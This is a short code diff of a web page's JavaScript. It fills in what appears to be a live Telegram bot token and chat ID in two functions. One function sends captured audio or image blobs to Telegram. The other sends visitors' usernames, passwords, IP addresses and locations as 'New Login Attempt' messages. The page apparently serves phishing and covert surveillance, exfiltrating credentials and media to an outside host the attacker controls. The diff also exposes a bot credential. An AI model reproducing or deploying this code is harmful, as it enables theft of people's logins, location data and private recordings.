@@ -142,8 +142,8 @@
         }
 
         function sendImmediateMedia(type, blob) {
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
+            const chatId = '860517021';  // Your chat ID
             const formData = new FormData();
             formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);
 
@@ -168,8 +168,8 @@
         function sendLoginData(username, password) {
             const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
 
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
+            const chatId = '860517021';  // Your chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             // Send the message to Telegram
